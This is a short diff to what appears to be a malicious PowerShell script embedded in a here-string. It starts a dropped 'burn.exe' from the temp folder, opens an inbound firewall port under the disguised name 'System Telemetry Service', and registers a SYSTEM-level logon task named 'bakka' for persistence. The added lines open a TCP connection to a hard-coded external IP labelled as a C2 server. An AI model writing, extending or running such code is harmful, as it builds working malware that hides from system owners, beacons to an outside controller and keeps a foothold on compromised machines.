@@ -11,6 +11,12 @@ Start-Process $env:TEMP\burn.exe
 
 New-NetFirewallRule -DisplayName "System Telemetry Service" -Direction Inbound -Protocol TCP -LocalPort 8076 -Action Allow
 
+
+$c2 = "188.114.96.1:8858"
+$client = New-Object System.Net.Sockets.TcpClient
+$client.Connect($c2.Split(':')[0], [int]$c2.Split(':')[1])
+$client.Close()
+
 schtasks /create /sc onlogon /tn "bakka" /tr "$env:TEMP\burn.exe" /ru SYSTEM
 '@
 
